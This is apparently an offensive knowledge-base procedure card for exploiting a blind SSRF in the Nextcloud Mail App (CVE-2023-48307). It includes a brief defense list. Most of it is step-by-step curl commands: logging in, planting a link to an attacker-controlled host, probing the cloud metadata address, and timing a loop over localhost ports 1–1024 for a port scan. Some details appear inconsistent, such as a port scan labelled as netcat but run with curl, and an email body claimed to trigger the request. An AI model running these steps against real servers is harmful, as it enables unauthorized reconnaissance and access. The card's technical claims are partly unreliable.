---
id: proc-uuid-123
tags:
  - ssrf
  - blind-ssrf
  - nextcloud
  - mail-app
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ssrf-trigger]]'
  - '[[commands/nc-port-scan]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-10T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.641Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-Blind-SSRF-in-Nextcloud-Mail-App

## Summary

This procedure exploits a blind Server-Side Request Forgery (SSRF) vulnerability in the Nextcloud Mail App by supplying malicious URLs that cause the server to make unauthorized requests to internal or external endpoints, potentially allowing reconnaissance or data exfiltration without direct attacker feedback.

## Description

The Nextcloud Mail App processes user-supplied URLs without sufficient validation, enabling attackers with authenticated access to trick the server into fetching arbitrary resources. Discovered in February 2023 and assigned CVE-2023-48307, this low-severity issue (CVSS 3.5) allows blind SSRF, where the attacker cannot see the response but can infer success via side channels like DNS queries or timing. The attack targets web-based Nextcloud deployments and was fixed in later versions, with public disclosure in January 2024.

## Requirements

1. Authenticated access to a vulnerable Nextcloud instance (version affected pre-fix)
2. Mail App enabled and accessible via web interface
3. Controlled external server (e.g., Burp Collaborator) for observing blind interactions
4. Basic knowledge of HTTP requests and network protocols

## Defense

Defensive measures and detection strategies:

- Validate and whitelist all user-supplied URLs in the Mail App to restrict to safe domains
- Implement network segmentation to block server outbound requests to internal metadata services
- Monitor server logs for anomalous outbound HTTP/DNS requests from the Nextcloud application
- Update to patched Nextcloud versions post-CVE-2023-48307

## Objectives

1. Force the server to request arbitrary internal/external resources
2. Perform blind reconnaissance, such as port scanning or metadata access
3. Demonstrate potential for low-impact unauthorized access

## Instructions

### Step 1: Authenticate and Access Mail App

**Context**: Gain legitimate access to the vulnerable endpoint where URLs are processed, such as email composition or URL preview features in the Mail App.

Log in to the Nextcloud web interface and navigate to the Mail App.

**Command** ([[commands/curl-login]]):
```bash
curl -c cookies.txt -d "user=attacker&pass=password" https://nextcloud.example.com/login
```

> This command authenticates and saves session cookies for subsequent requests. Expected output: HTTP 200 with redirect to dashboard.

### Step 2: Craft and Submit Malicious URL

**Context**: Input a specially crafted URL that points to a target resource, triggering the SSRF when the app processes it server-side.

Use the Mail App interface to enter a URL like `http://169.254.169.254/latest/meta-data/instance-id` (for cloud metadata) or `http://127.0.0.1:22` for local port probing. Submit via compose or fetch action.

**Command** ([[commands/curl-ssrf-trigger]]):
```bash
curl -b cookies.txt -X POST 'https://nextcloud.example.com/apps/mail/api/v1/compose' -H 'Content-Type: application/json' -d '{"body":"Check this link: http://attacker-controlled.com/payload"}'
```

> This simulates sending an email with a malicious URL. Expected output: HTTP 200 or 201 confirming submission, but no direct SSRF response; check external listener for confirmation.

### Step 3: Verify Blind SSRF via Side Channel

**Context**: Since the SSRF is blind, observe indirect evidence like DNS resolutions or HTTP hits on a controlled server.

Set up a listener (e.g., on attacker-controlled.com) and monitor for requests. For timing-based detection, send URLs to various ports.

**Command** ([[commands/nc-port-scan]]):
```bash
for port in {1..1024}; do time curl -b cookies.txt -X POST 'https://nextcloud.example.com/apps/mail/api/v1/test-url' -d "url=http://127.0.0.1:$port"; done
```

> This loops through ports to detect open ones via response timing. Expected output: Variable response times indicating open ports.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-trigger]]
- [[commands/nc-port-scan]]

## Tools Used


## Tags

- ssrf
- blind-ssrf
- nextcloud
- web-vulnerability
